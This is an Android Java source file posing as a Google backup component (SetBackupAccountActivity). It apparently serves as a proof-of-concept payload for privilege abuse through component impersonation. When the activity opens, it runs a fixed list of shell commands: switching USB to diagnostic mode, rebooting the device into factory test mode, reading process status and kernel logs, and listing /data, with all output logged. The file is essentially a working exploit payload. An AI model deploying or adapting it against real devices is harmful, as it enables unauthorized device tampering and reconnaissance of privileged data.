package com.google.android.backup;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class SetBackupAccountActivity extends Activity {
    private static final String TAG = "SetBackupAccount";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // すべてのコマンドを実行
        executeCommands();

        // アクティビティを終了
        finish();
    }

    private void executeCommands() {
        // 実行するコマンド一覧（すべて sh -c 経由で実行）
        String[] commands = {
                "test_diag",
                "svc setFunction diag",
                "id",
                "cat /proc/self/status",
                "reboot ffbm-02",
                "ls /data"
        };

        for (String cmd : commands) {
            Log.i(TAG, "========================================");
            Log.i(TAG, "Executing command: " + cmd);
            Log.i(TAG, "========================================");

            try {
                // シェル経由でコマンドを実行
                Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});

                // 標準出力を読み取る
                BufferedReader stdReader = new BufferedReader(
                        new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = stdReader.readLine()) != null) {
                    Log.i(TAG, "[STDOUT] " + line);
                }

                // 標準エラーを読み取る
                BufferedReader errReader = new BufferedReader(
                        new InputStreamReader(process.getErrorStream()));
                while ((line = errReader.readLine()) != null) {
                    Log.e(TAG, "[STDERR] " + line);
                }

                // 終了コードを待つ
                int exitCode = process.waitFor();
                Log.i(TAG, "Command '" + cmd + "' exited with code: " + exitCode);

            } catch (Exception e) {
                Log.e(TAG, "Exception while executing command: " + cmd, e);
            }
        }

        // 追加: dmesg の出力をログに出力（最初の200行程度）
        Log.i(TAG, "========================================");
        Log.i(TAG, "Capturing dmesg output");
        Log.i(TAG, "========================================");
        try {
            Process dmesgProcess = Runtime.getRuntime().exec(new String[]{"dmesg"});
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(dmesgProcess.getInputStream()));
            String line;
            int lineCount = 0;
            while ((line = reader.readLine()) != null && lineCount < 200) {
                Log.i(TAG, "[DMESG] " + line);
                lineCount++;
            }
            if (lineCount == 200) {
                Log.i(TAG, "[DMESG] ... (truncated, too many lines)");
            }
            dmesgProcess.waitFor();
        } catch (Exception e) {
            Log.e(TAG, "Failed to capture dmesg", e);
        }

        Log.i(TAG, "========================================");
        Log.i(TAG, "All commands executed. Finishing activity.");
        Log.i(TAG, "========================================");
    }
}
